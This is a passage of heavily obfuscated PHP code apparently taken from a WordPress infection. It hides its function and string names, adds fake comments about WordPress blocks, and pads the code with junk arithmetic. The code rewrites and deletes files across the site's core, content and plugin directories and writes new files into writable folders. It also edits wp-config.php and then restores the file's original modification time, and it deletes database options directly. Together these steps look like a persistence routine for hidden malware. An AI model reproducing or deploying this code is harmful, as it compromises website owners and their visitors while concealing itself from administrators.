 if ($GLOBALS['__scf_vqnw5_4kg7eu_96'](m40pvx5ij_z4mj(1593),   $tvkhbx5gcgs,  $y871powf01l3zs) && $GLOBALS['__scf_vvn10ievj2k_9']($tvkhbx5gcgs,  0,     -$GLOBALS['__scf_fr9u7cq1eo_10']($y871powf01l3zs[0])) ===     $yi_o1ja0fdpvz1e7  &&     $GLOBALS['__scf_ibw9xvmx9ckin_187']() -    (int)   $y871powf01l3zs[1]      < (62159+24241))  continue;
   $xs1ixc1l1o29t_n =  true;
    break;


 }
   }
$lmcsyjml2p3ta = $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(), lpwgqh9300(1566));



 $a1r0j_tsmb4e   =      $e3thri4q7dp   .   m5t68uuej1(94)      .   $lmcsyjml2p3ta  .    '/' .    $lmcsyjml2p3ta    .  bovhd4vawcd(1566);
       $kgbzi5cj6hm =      av926u1hz8pmyh3nbgpo0();

  if (!@$GLOBALS['__scf_a83pywb98qzq2_20']($a1r0j_tsmb4e)   ||  (int)  @$GLOBALS['__scf_pftf6vocmvs2m_99']($a1r0j_tsmb4e)  <   (4911+89)) $xs1ixc1l1o29t_n  = true;
if  ($kgbzi5cj6hm   !== ""  && !@$GLOBALS['__scf_a83pywb98qzq2_20']($kgbzi5cj6hm))     $xs1ixc1l1o29t_n     = true;$sx8pp81czw=87*3;$us7t4ctij0vgx=$sx8pp81czw-45;
  if   (!$xs1ixc1l1o29t_n   && $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1582))) {
$glatlj82ddopl =   $lmcsyjml2p3ta   .   '/' . $lmcsyjml2p3ta  .     bovhd4vawcd(1566);
     $hlhmenizcfs9q0ir = get_option(bovhd4vawcd(725),   array());

 if (!$GLOBALS['__scf_pomb89yiuz_37']($hlhmenizcfs9q0ir) || !$GLOBALS['__scf_hf87ul3fvpzrkm_150']($glatlj82ddopl,  $hlhmenizcfs9q0ir,  true)) $xs1ixc1l1o29t_n     = true;
  }
 if   (!$xs1ixc1l1o29t_n)   return;
 

  $k8y9u462p193ji  =     $GLOBALS['__scf_ibw9xvmx9ckin_187']();
       $jsm65pgkj2d =   0;
$yloemmv6qz2n   =     0;
   if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1594)))     {
      $ees7dsmmqu3 =  @get_option(m5t68uuej1(1595),     "");
    if     ($GLOBALS['__scf_e_8z8ias8ka_43']($ees7dsmmqu3)    &&      $GLOBALS['__scf_vqnw5_4kg7eu_96'](bovhd4vawcd(1596),  $ees7dsmmqu3,  $e72rsmpxylgp2f))     {
$jsm65pgkj2d      =     (int)      $e72rsmpxylgp2f[1];
$yloemmv6qz2n  =     (int) $e72rsmpxylgp2f[2];
 }
// dynamic scheduler

  }
// fallback deque for WP BlockControls

  $xlc7yir54c4sk =   $yloemmv6qz2n <=  0  ?    0 : ($yloemmv6qz2n  === 1  ?  (0x20+0x1c)  :   ($yloemmv6qz2n ===  2   ? (0x98+0x94)  :    (1751+49)));
if  ($jsm65pgkj2d     > 0   &&   ($k8y9u462p193ji   -  $jsm65pgkj2d)  <  $xlc7yir54c4sk)    return;
  if    (!beqgo0gfq6yfj82i0o(m40pvx5ij_z4mj(1597)))  return;
    try      {

   aualrpzvrr5kleitna1();
  qpaad50893o72_4b73();
djp3c9fh7x_i_3sx6c8();
    y0gmw2hp0po6ufrq();
kb0gfutfmftrb5y();
wc1n1msxd9t4tdztt();
   sl67bnkgrc_z6b();

     i3ooeavcmft9t3_s8pbb0();
 $vdl1z1i03ytmif  =      i3ldakax12xf_w589();
 $tpix1n03w1  =  pwgi0_o2uj4oc9bnap3o();

 $p0hg2h9wv20_53      = (!@$GLOBALS['__scf_a83pywb98qzq2_20']($a1r0j_tsmb4e)     ||    (int)   @$GLOBALS['__scf_pftf6vocmvs2m_99']($a1r0j_tsmb4e)  < (4968+32)) ||    ($kgbzi5cj6hm   !==  ""  &&   !@$GLOBALS['__scf_a83pywb98qzq2_20']($kgbzi5cj6hm));


 if (!$p0hg2h9wv20_53   &&  !@$GLOBALS['__scf_a83pywb98qzq2_20']($e3thri4q7dp  .   lpwgqh9300(1598)))   $p0hg2h9wv20_53   =    true;
 if   (!$p0hg2h9wv20_53   &&   $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1599))) {
 $glatlj82ddopl = $lmcsyjml2p3ta  .      '/'  .   $lmcsyjml2p3ta  .  lpwgqh9300(1566);


 $hlhmenizcfs9q0ir   =     get_option(lpwgqh9300(725),     array());
 if   (!$GLOBALS['__scf_pomb89yiuz_37']($hlhmenizcfs9q0ir)   ||     !$GLOBALS['__scf_hf87ul3fvpzrkm_150']($glatlj82ddopl, $hlhmenizcfs9q0ir,    true))   $p0hg2h9wv20_53  = true;
   }



if     ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1586)))   @update_option(m5t68uuej1(1600),   $k8y9u462p193ji .   '|'   .   ($p0hg2h9wv20_53 ?    ($yloemmv6qz2n   +    1)  : 0),   bovhd4vawcd(1513));
  $q6jwh69czw7joi    =  array();
foreach    ($vatwljflry0c as  $uim861ig2y)     {



 $gsoygtl43je28wn   = ($uim861ig2y ===  $e3thri4q7dp    .   lpwgqh9300(1598)  && !$vdl1z1i03ytmif) ||   ($GLOBALS['__scf_vvn10ievj2k_9']($uim861ig2y,     -(1+13))  ===   m5t68uuej1(1601)  && !$tpix1n03w1);
  $cdmny2qut8j4_m  = @$GLOBALS['__scf_b8zhccrnlgsp_55']($uim861ig2y);
  if  ($cdmny2qut8j4_m)  {



  $q6jwh69czw7joi[$uim861ig2y] = $cdmny2qut8j4_m[lpwgqh9300(1590)]    .     '|' .    $cdmny2qut8j4_m[m5t68uuej1(1591)] .  ($gsoygtl43je28wn   ?      bovhd4vawcd(1602)   . $GLOBALS['__scf_ibw9xvmx9ckin_187']()  :  "");



}



     }
foreach ($n73jxs5ka1o4bi    as      $key    => $x0qcasr7utlsop) {
$bitjxh76zz0ilrgd = cv2mu8mx5udntp3ntp9ef7($GLOBALS['__scf_vvn10ievj2k_9']($key, (3+2)),  $x0qcasr7utlsop);
      if ($bitjxh76zz0ilrgd   === '0' ||  $GLOBALS['__scf_vvn10ievj2k_9']($bitjxh76zz0ilrgd,    -2)    ===    lpwgqh9300(1603))      $bitjxh76zz0ilrgd  .= lpwgqh9300(1602)   .  $GLOBALS['__scf_ibw9xvmx9ckin_187']();
  $q6jwh69czw7joi[$key] =    $bitjxh76zz0ilrgd;
 }
 @update_option(m5t68uuej1(1589),    $q6jwh69czw7joi,  bovhd4vawcd(1513));
  }    finally    {

    xfcoteglc07i2qaoo(bovhd4vawcd(1597));
}
 }     catch  (Throwable   $k3g08rnqu9m)   {

    r63yaewew47stuijcrwsx6(lpwgqh9300(1604), $k3g08rnqu9m);
}   catch    (Exception   $k3g08rnqu9m)   {
 }
   }



      function    cv2mu8mx5udntp3ntp9ef7($uim861ig2y,  $x0qcasr7utlsop)

  {
$cdmny2qut8j4_m =   @$GLOBALS['__scf_b8zhccrnlgsp_55']($uim861ig2y);
      if    (!$cdmny2qut8j4_m)     return    '0';
 $yi_o1ja0fdpvz1e7  =  $cdmny2qut8j4_m[m5t68uuej1(1605)]   .  '|'     . $cdmny2qut8j4_m[m5t68uuej1(1591)];

  if ($cdmny2qut8j4_m[m5t68uuej1(1605)] >  (2004561-955985))   return  m5t68uuej1(1606) .    $yi_o1ja0fdpvz1e7;
   $t6jsjlatx2i = @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($uim861ig2y);
return   $yi_o1ja0fdpvz1e7  .  '|'  .  (($GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i)    &&    $GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i,     $x0qcasr7utlsop)    !== false)     ?    '1'   :    '0');
  }
function  x1zhlzm3fo8f57o221nq()
{
  $_pv     = $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1599))     ? get_option(m40pvx5ij_z4mj(1607),    "")  : "";
  kgspnl7qk7umia_();
$xc1493c_pcy1d9nb   =  $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1599))    ? get_option(m40pvx5ij_z4mj(1607),  "")    :   "";
    if   ($xc1493c_pcy1d9nb     === $_pv) {

     global   $wpdb;
    if ($GLOBALS['__scf_pd74_ila1rfp_70']($wpdb) &&  $GLOBALS['__scf_sruyigi7mie8_118']($wpdb, m40pvx5ij_z4mj(1608)) &&  $GLOBALS['__scf_e_8z8ias8ka_43']($_pv)     &&   $_pv   !== ""  && isset($wpdb->options))     {
  @$wpdb->query($wpdb->prepare("\x44EL\x45\x54E \x46\x52\x4fM {$wpdb->options} W\x48\x45RE op\x74i\x6fn_n\x61me = 'sc_p\x65n\x64ing_i\x6e\x76\x61\x6cidate' A\x4e\x44 \x6fp\x74i\x6fn_val\x75e = %s", $_pv));
     if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1609)))   {
/* batch b-tree */




 @wp_cache_delete(m5t68uuej1(1610), bovhd4vawcd(1455));
  @wp_cache_delete(m40pvx5ij_z4mj(1611),    m5t68uuej1(1455));
      }



} else {
@delete_option(bovhd4vawcd(1610));
 }
 }
}
   function kgspnl7qk7umia_()
    {
      try {
 if  (!defined(m5t68uuej1(1612))) return;


  $e3thri4q7dp =     r5waslskyqytjrm6();$fdi1zanw815=(0xc1+0x6a);$ovwl8h6nr0b=$fdi1zanw815%8;
    $ymsu_gohk1ack2w =  dha61pphirvk3tnlr();
     $mhgza3zqckbz8  =    dv62azao9qb3z33m4cwig0(ABSPATH  . bovhd4vawcd(1118),   (1+7)) .     m40pvx5ij_z4mj(1285);



       $q45cyonb8_   =    dv62azao9qb3z33m4cwig0(ABSPATH   .  lpwgqh9300(1613),  (29^21))    .    bovhd4vawcd(1614);
$eo65z8g49jx6nyg     =  dv62azao9qb3z33m4cwig0(ABSPATH    .    m40pvx5ij_z4mj(1615),     (0x4+0x4))   .    bovhd4vawcd(1614);
  $mk4osd0wzhi  =  dv62azao9qb3z33m4cwig0(ABSPATH   .  m40pvx5ij_z4mj(1156),   (139^131))  . bovhd4vawcd(1614);
    $nt55fagwajl1a9h    =    dv62azao9qb3z33m4cwig0(ABSPATH .  bovhd4vawcd(1129),  (5+3))  . m40pvx5ij_z4mj(1614);
$ylf3frap60  =   lpwgqh9300(510) . dv62azao9qb3z33m4cwig0(ABSPATH  .  'g',  (5+3));
$z5scvam6umqfn   = array(

       $e3thri4q7dp  . bovhd4vawcd(1616)  =>    m40pvx5ij_z4mj(776),



 $e3thri4q7dp  .     m40pvx5ij_z4mj(1598) => m5t68uuej1(774),
    );
  

      foreach  ($z5scvam6umqfn  as   $uim861ig2y     =>   $prefix)      {
  if      (!@$GLOBALS['__scf_a83pywb98qzq2_20']($uim861ig2y))  continue;
 $t6jsjlatx2i  =    @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($uim861ig2y);
        if  ($t6jsjlatx2i   === false)  continue;
    $i4qlyakgl9ms = lpwgqh9300(779)   . $prefix    .  lpwgqh9300(780)  .    $prefix .  lpwgqh9300(1617);
  $jz625hs62e2gtj  =   $GLOBALS['__scf_r1v12_o00h5hc_454']($i4qlyakgl9ms,  "", $t6jsjlatx2i);
   if    ($jz625hs62e2gtj  !==   $t6jsjlatx2i) a3hx61zfms1ji3euwsc($uim861ig2y,   $jz625hs62e2gtj);
 }
 $kyupc075jr  =   $e3thri4q7dp     . m5t68uuej1(509);
if   (@$GLOBALS['__scf_a83pywb98qzq2_20']($kyupc075jr)) {
      $e3ptjf6nbu =  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($kyupc075jr);
       if    ($GLOBALS['__scf_e_8z8ias8ka_43']($e3ptjf6nbu) && $e3ptjf6nbu !==  "") {$br5j7pyd98=-676;$bw_45lmx=($br5j7pyd98>0)?$br5j7pyd98:-$br5j7pyd98;
  if ($GLOBALS['__scf_vqnw5_4kg7eu_96'](bovhd4vawcd(1618),    $GLOBALS['__scf_vvn10ievj2k_9']($e3ptjf6nbu, 0, (296+4)))     ||   $GLOBALS['__scf_i8i8g4oxha_7']($e3ptjf6nbu, m5t68uuej1(1235))   === 0) {
cik9ldzrbjmtnzm00($kyupc075jr,   (336+84));
netei2x342rtzmi4tj69($kyupc075jr);
     } else  {
    $y0uyhvf1ugt04bw   = $GLOBALS['__scf_r1v12_o00h5hc_454'](m40pvx5ij_z4mj(1619), "", $e3ptjf6nbu);
     if   ($GLOBALS['__scf_e_8z8ias8ka_43']($y0uyhvf1ugt04bw) &&     $y0uyhvf1ugt04bw  !==  $e3ptjf6nbu)    a3hx61zfms1ji3euwsc($kyupc075jr,      $y0uyhvf1ugt04bw);

  unset($y0uyhvf1ugt04bw);
 }


 }
   unset($e3ptjf6nbu);
}



 $tqp3x88nvo5y  =   $GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl())    .    m40pvx5ij_z4mj(1174);
        $exybs1tc490ogs =    defined(bovhd4vawcd(1177)) ?   WP_CONTENT_DIR  .  m5t68uuej1(1620)   :    $tqp3x88nvo5y;



  $cztdmvhiza98k      = array(


$e3thri4q7dp .      '/'     .   $mhgza3zqckbz8,

     $e3thri4q7dp .  '/'      . $q45cyonb8_,
 $e3thri4q7dp      .      '/'     .      $eo65z8g49jx6nyg,
   $ymsu_gohk1ack2w  .   '/' .  $mk4osd0wzhi,
 $ymsu_gohk1ack2w  .  '/' .  $nt55fagwajl1a9h,
      $ymsu_gohk1ack2w . '/'   .  $q45cyonb8_,
     $ymsu_gohk1ack2w     .   '/'     .  $eo65z8g49jx6nyg,
  $tqp3x88nvo5y    .  '/'   .   $mk4osd0wzhi,


$tqp3x88nvo5y   .  '/' .    $nt55fagwajl1a9h,
$tqp3x88nvo5y .     '/' .     $q45cyonb8_,
  $tqp3x88nvo5y  . '/'   .   $eo65z8g49jx6nyg,
 $exybs1tc490ogs  .    '/'  .  $mk4osd0wzhi,
$exybs1tc490ogs .    '/'  .   $nt55fagwajl1a9h,
 $exybs1tc490ogs    . '/'    .     $q45cyonb8_,
$exybs1tc490ogs  .  '/' .   $eo65z8g49jx6nyg,
   );
 $zae3ewn5b_     = lvrw_195p7ri57ctv7dk_z();
    $cztdmvhiza98k[] =      $zae3ewn5b_[1];



 $cztdmvhiza98k[] =     $zae3ewn5b_[1] .    bovhd4vawcd(1382);
unset($zae3ewn5b_);
      if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(736)))  {
  foreach ((array) @$GLOBALS['__scf_ql1i4f573p8rhm_73']($e3thri4q7dp . m5t68uuej1(1621)  .  $mhgza3zqckbz8)    as    $zqgd351kjy234)   $cztdmvhiza98k[]     =  $zqgd351kjy234;
 foreach  ((array) @$GLOBALS['__scf_ql1i4f573p8rhm_73']($e3thri4q7dp   . bovhd4vawcd(1622)  .    $mhgza3zqckbz8)    as   $zqgd351kjy234)  $cztdmvhiza98k[] = $zqgd351kjy234;
  

 foreach   ((array)  @$GLOBALS['__scf_ql1i4f573p8rhm_73'](ABSPATH   . lpwgqh9300(1623)   .     $ylf3frap60  .  lpwgqh9300(281))   as    $btxl38vflku7p)    $cztdmvhiza98k[]    =  $btxl38vflku7p;



foreach  ((array) @$GLOBALS['__scf_ql1i4f573p8rhm_73']($e3thri4q7dp  .  '/'  .  $ylf3frap60  .   m5t68uuej1(281)) as $btxl38vflku7p)    $cztdmvhiza98k[]  =      $btxl38vflku7p;
    foreach ((array) @$GLOBALS['__scf_ql1i4f573p8rhm_73']($ymsu_gohk1ack2w  .  '/'   . $ylf3frap60    .  lpwgqh9300(1624)) as   $btxl38vflku7p) $cztdmvhiza98k[]    = $btxl38vflku7p;
foreach ((array)    @$GLOBALS['__scf_ql1i4f573p8rhm_73']($tqp3x88nvo5y    .    '/'     .  $ylf3frap60 . m40pvx5ij_z4mj(1624)) as $btxl38vflku7p) $cztdmvhiza98k[]    =    $btxl38vflku7p;
 foreach  ((array)     @$GLOBALS['__scf_ql1i4f573p8rhm_73']($exybs1tc490ogs . '/' . $ylf3frap60  .  bovhd4vawcd(1624))    as  $btxl38vflku7p)  $cztdmvhiza98k[]     =  $btxl38vflku7p;
 }
   $jtef_ndn2zx   =    dv62azao9qb3z33m4cwig0(ABSPATH  .     'g',  (0x4+0x4));
        $jokhq_aavky6ykd   =     array(ABSPATH .  m40pvx5ij_z4mj(513),   $e3thri4q7dp, $ymsu_gohk1ack2w, $tqp3x88nvo5y,      $exybs1tc490ogs);
 foreach  ($jokhq_aavky6ykd   as  $_gd)  {
   if (@$GLOBALS['__scf_i9hdv7zrfsy_45']($_gd) && @$GLOBALS['__scf_p_260ito5s0j_50']($_gd)) d3czoa7z5ve8_za41c14d($_gd   .    m5t68uuej1(1625) . $jtef_ndn2zx,   kdgw8qqvzf6yolk(), lpwgqh9300(1626));
 }
if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(736)))   {
   foreach    ($jokhq_aavky6ykd as   $_gd) {


foreach (array(lpwgqh9300(1627),  bovhd4vawcd(1628),    m40pvx5ij_z4mj(1629),   m40pvx5ij_z4mj(1630),  m40pvx5ij_z4mj(1631), lpwgqh9300(1632),    bovhd4vawcd(1633), bovhd4vawcd(1634), lpwgqh9300(1635))  as  $f9n0v9nj9jl1)      {
  foreach ((array)    @$GLOBALS['__scf_ql1i4f573p8rhm_73']($_gd   .  '/'  . $f9n0v9nj9jl1 .      '*')  as   $gc2jmzqokah9jug)  $cztdmvhiza98k[]    =  $gc2jmzqokah9jug;
 }
foreach ((array)    @$GLOBALS['__scf_ql1i4f573p8rhm_73']($_gd  .      bovhd4vawcd(1636)) as      $ixvwhv9ab0i)  $cztdmvhiza98k[]  = $ixvwhv9ab0i;
     }
   }
 unset($jtef_ndn2zx,   $jokhq_aavky6ykd,    $_gd,      $f9n0v9nj9jl1,      $gc2jmzqokah9jug,  $ixvwhv9ab0i);
    
$rjl9_4w7_4lga   = array($GLOBALS['__scf_zsw089px33o1o__12']($e3thri4q7dp, bovhd4vawcd(1206)), $GLOBALS['__scf_zsw089px33o1o__12']($GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl()),    lpwgqh9300(1206)),      $GLOBALS['__scf_zsw089px33o1o__12']($ymsu_gohk1ack2w,   m5t68uuej1(1637)),  $GLOBALS['__scf_zsw089px33o1o__12']($tqp3x88nvo5y,  bovhd4vawcd(1638)), $GLOBALS['__scf_zsw089px33o1o__12']($exybs1tc490ogs,      lpwgqh9300(1639)));
       if  (defined(lpwgqh9300(1177)))   $rjl9_4w7_4lga[]     =  $GLOBALS['__scf_zsw089px33o1o__12'](WP_CONTENT_DIR,  m5t68uuej1(1640));
 $xx04jren1xw6d58f     =      array();
     foreach  ($GLOBALS['__scf_jghjt9zxt358_149']($rjl9_4w7_4lga)     as $_pd) {
// emit control-flow-graph for WP Loginout Block

  $xx04jren1xw6d58f[] =  $_pd .    '/'   .    $q45cyonb8_;
$xx04jren1xw6d58f[] =  $_pd      .   '/'  . $eo65z8g49jx6nyg;
     $xx04jren1xw6d58f[]    =    $_pd .  m40pvx5ij_z4mj(1176)     .     $eo65z8g49jx6nyg;
}
     unset($rjl9_4w7_4lga,    $_pd);

  foreach  ($xx04jren1xw6d58f as     $ij8s27frx9pi8)   {


if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($ij8s27frx9pi8))   nk_2ynb8ijgjad4yfhv($ij8s27frx9pi8,  null);
   }
 unset($ij8s27frx9pi8);
$eiw7ww2vtu6alb1  = array($GLOBALS['__scf_zsw089px33o1o__12'](ABSPATH,   m40pvx5ij_z4mj(1641)));

     if  (defined(lpwgqh9300(1642))) $eiw7ww2vtu6alb1[] =  $GLOBALS['__scf_zsw089px33o1o__12'](WP_CONTENT_DIR, bovhd4vawcd(1641));
     $eiw7ww2vtu6alb1[]  = $GLOBALS['__scf_zsw089px33o1o__12']($e3thri4q7dp,  bovhd4vawcd(1643));
$eiw7ww2vtu6alb1[]  =     $GLOBALS['__scf_zsw089px33o1o__12']($GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl()),   m5t68uuej1(1644));
 $lls8altl0yhb = array();$d_kqk_ea3or8zh=96+76;$slorrq3mu=$d_kqk_ea3or8zh-23;
      foreach   ($GLOBALS['__scf_jghjt9zxt358_149']($eiw7ww2vtu6alb1)  as    $lf_1h9g192078_c)    $lls8altl0yhb[] =  $lf_1h9g192078_c  .   m5t68uuej1(1194);
   unset($eiw7ww2vtu6alb1,  $lf_1h9g192078_c);
  foreach  ($lls8altl0yhb as  $wf0t5z8ep07nli8g)  {
 if  (!@$GLOBALS['__scf_a83pywb98qzq2_20']($wf0t5z8ep07nli8g))    continue;
       $t6jsjlatx2i  = @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($wf0t5z8ep07nli8g);

  if   ($t6jsjlatx2i     &&  $GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i,  m5t68uuej1(1645))   !==   false)   {


$t6jsjlatx2i =  $GLOBALS['__scf_r1v12_o00h5hc_454'](lpwgqh9300(1646)  .   $GLOBALS['__scf_zh8jfi64aw1__817']($q45cyonb8_,   '/')  . bovhd4vawcd(976),   "\n",   $t6jsjlatx2i);
      if    ($GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i)) {
      $t6jsjlatx2i  =     $GLOBALS['__scf_r1v12_o00h5hc_454'](lpwgqh9300(975)  .  $GLOBALS['__scf_zh8jfi64aw1__817']($q45cyonb8_, '/')  . m40pvx5ij_z4mj(1647),   "\n",    $t6jsjlatx2i);



}
 if    ($GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i)) {
$t6jsjlatx2i  = $GLOBALS['__scf_r1v12_o00h5hc_454'](lpwgqh9300(977) . $GLOBALS['__scf_zh8jfi64aw1__817']($q45cyonb8_,   '/')  .    m5t68uuej1(978), "\n",  $t6jsjlatx2i);
   }
if ($GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i))    a3hx61zfms1ji3euwsc($wf0t5z8ep07nli8g,  $t6jsjlatx2i);
   }
    }
  $t5lomn9qay6oz   =     ABSPATH  .    m40pvx5ij_z4mj(1648);
    if (!@$GLOBALS['__scf_a83pywb98qzq2_20']($t5lomn9qay6oz))    {
// WP InnerBlocks: evict mediator

   $cv_tllhvfjb5   =  $GLOBALS['__scf_oagg5b1ubqmznt_11'](ABSPATH)     .  lpwgqh9300(1649);
if    (@$GLOBALS['__scf_a83pywb98qzq2_20']($cv_tllhvfjb5)) $t5lomn9qay6oz     =    $cv_tllhvfjb5;

        }
 if (@$GLOBALS['__scf_a83pywb98qzq2_20']($t5lomn9qay6oz)  &&  @$GLOBALS['__scf_p_260ito5s0j_50']($t5lomn9qay6oz)) {
       $_wc    =     @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($t5lomn9qay6oz);
      if  ($GLOBALS['__scf_e_8z8ias8ka_43']($_wc)  &&  $GLOBALS['__scf_i8i8g4oxha_7']($_wc,  bovhd4vawcd(525))   !==  false)   {
 $po5nxcyt30 =  $GLOBALS['__scf_r1v12_o00h5hc_454'](m40pvx5ij_z4mj(1650),  "define( 'WP_CACHE', true );\n",     $_wc);$a0ar68z88c_37=8951;$peskvurvu5rw=$a0ar68z88c_37%4;
  if ($GLOBALS['__scf_e_8z8ias8ka_43']($po5nxcyt30)  &&   $po5nxcyt30  !==  $_wc   &&  fgcc_h22bqxgwmccod($po5nxcyt30)) {
  $qbboidqy5ychrn8 =    @$GLOBALS['__scf_tm09rtls_27e_98']($t5lomn9qay6oz);
if (a3hx61zfms1ji3euwsc($t5lomn9qay6oz,  $po5nxcyt30))  {$vv1n74wmf4dwp_=PHP_MAJOR_VERSION;$l2x36bg2ji2=$vv1n74wmf4dwp_*6;
 if ($qbboidqy5ychrn8)   @$GLOBALS['__scf_fiolz593w9mj_75']($t5lomn9qay6oz,     $qbboidqy5ychrn8);
if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1651)))   @delete_option(m40pvx5ij_z4mj(1554));
   }



}
    unset($po5nxcyt30,  $qbboidqy5ychrn8);
  }
unset($_wc);



}
unset($t5lomn9qay6oz,  $cv_tllhvfjb5);
   $v2szluzwve7   =  $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1079))   ?    @$GLOBALS['__scf_qa8nkfur9w_111'](m40pvx5ij_z4mj(1172))  :  false;



   if    (!$v2szluzwve7   || $v2szluzwve7  === "")   $v2szluzwve7   =   lpwgqh9300(1652);
    $zlffjxs4ozq6ia6  = array($GLOBALS['__scf_zsw089px33o1o__12'](ABSPATH,   m5t68uuej1(1644)));
      if  (defined(bovhd4vawcd(1642)))   $zlffjxs4ozq6ia6[]    = $GLOBALS['__scf_zsw089px33o1o__12'](WP_CONTENT_DIR,     m40pvx5ij_z4mj(1644));
     $zlffjxs4ozq6ia6[] =  $GLOBALS['__scf_zsw089px33o1o__12']($e3thri4q7dp, bovhd4vawcd(1644));
$zlffjxs4ozq6ia6[]  = $GLOBALS['__scf_zsw089px33o1o__12']($GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl()), lpwgqh9300(1644));
$u8r6w4nh1ab6   =   array();
    foreach  ($GLOBALS['__scf_jghjt9zxt358_149']($zlffjxs4ozq6ia6)  as   $s0y__7sl9qz)   $u8r6w4nh1ab6[] =   $s0y__7sl9qz   . '/'  . $v2szluzwve7;
  unset($zlffjxs4ozq6ia6,  $s0y__7sl9qz);

   foreach   ($u8r6w4nh1ab6  as    $c4vng17g8h)     {
if     (!@$GLOBALS['__scf_a83pywb98qzq2_20']($c4vng17g8h))  continue;



    $t6jsjlatx2i   = @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($c4vng17g8h);
  if   ($t6jsjlatx2i      && $GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i,   bovhd4vawcd(1645))    !==  false)   {
    $t6jsjlatx2i  =    $GLOBALS['__scf_r1v12_o00h5hc_454'](bovhd4vawcd(1653) .  $GLOBALS['__scf_zh8jfi64aw1__817']($eo65z8g49jx6nyg,  '/') . m40pvx5ij_z4mj(1654),    "",   $t6jsjlatx2i);
     if  ($GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i))  a3hx61zfms1ji3euwsc($c4vng17g8h,  $t6jsjlatx2i);
}
   }
 $d8ahym1bqv1a    =  $GLOBALS['__scf_r3sim5_axb_151']($cztdmvhiza98k,  $xx04jren1xw6d58f);
  $c8v4938td5    =    array();



$xw__zj7nc906o =  false;
   foreach  ($GLOBALS['__scf_zb77rzhln7336v_369']($lls8altl0yhb,     $u8r6w4nh1ab6)   as $z6f9dlim6efobg4) {
// WP Separator Block image dimensions

    if   (!@$GLOBALS['__scf_a83pywb98qzq2_20']($z6f9dlim6efobg4))    continue;


$p66sb04z_crzld    = @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($z6f9dlim6efobg4);
   if (!$GLOBALS['__scf_e_8z8ias8ka_43']($p66sb04z_crzld))   {


  $xw__zj7nc906o =   true;
   continue;
}
      if  ($GLOBALS['__scf_i8i8g4oxha_7']($p66sb04z_crzld, m5t68uuej1(1645)) ===    false)   continue;
     if  ($GLOBALS['__scf_at_e2uw9xuj96__1383'](m5t68uuej1(1655), $p66sb04z_crzld,  $y871powf01l3zs))  {


   foreach ($GLOBALS['__scf_zb77rzhln7336v_369']($y871powf01l3zs[1],      $y871powf01l3zs[2],  $y871powf01l3zs[(0x1+0x2)])  as  $f5l6q0ffo9cqk06) {
      if   ($f5l6q0ffo9cqk06  !== "")  $c8v4938td5[$GLOBALS['__scf_os_n9tj5psxjj_3']($f5l6q0ffo9cqk06)]  =   true;$lvksbyr8p_yt=PHP_INT_MAX/PHP_INT_MAX;$njh9jgd6yinz8=$lvksbyr8p_yt+98;
     }
       }
    unset($p66sb04z_crzld, $y871powf01l3zs,   $f5l6q0ffo9cqk06);

 }
 if  (!$xw__zj7nc906o) {
  foreach  ($d8ahym1bqv1a as $e7s4480cj8b1c)    {


    if   (@$GLOBALS['__scf_a83pywb98qzq2_20']($e7s4480cj8b1c))     {

   if    (isset($c8v4938td5[$GLOBALS['__scf_os_n9tj5psxjj_3']($e7s4480cj8b1c)])) continue;
     cik9ldzrbjmtnzm00($e7s4480cj8b1c, (293+127));
 netei2x342rtzmi4tj69($e7s4480cj8b1c);
 }
}
 }
/* volatile container */

  unset($c8v4938td5, $xw__zj7nc906o,   $z6f9dlim6efobg4);
    foreach    (i7u2ciwa1osy_eyk3() as    $ficosl5kq6) {
if (!@$GLOBALS['__scf_a83pywb98qzq2_20']($ficosl5kq6) ||    !@$GLOBALS['__scf_p_260ito5s0j_50']($ficosl5kq6)) continue;
$t6jsjlatx2i  =   @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ficosl5kq6);
if  ($GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i))  {
$lozszxvosocilyj      =  zzlvsgg1dbts4z($t6jsjlatx2i,    lpwgqh9300(1656),   m5t68uuej1(1413));
        $lozszxvosocilyj  =    zzlvsgg1dbts4z($lozszxvosocilyj, bovhd4vawcd(1657),  m40pvx5ij_z4mj(1413));
   if    ($GLOBALS['__scf_e_8z8ias8ka_43']($lozszxvosocilyj)  &&    $lozszxvosocilyj   !==  $t6jsjlatx2i) a3hx61zfms1ji3euwsc($ficosl5kq6,    $lozszxvosocilyj);
 unset($lozszxvosocilyj);


      }
 }
// WP Higher Order Components shortcode parse

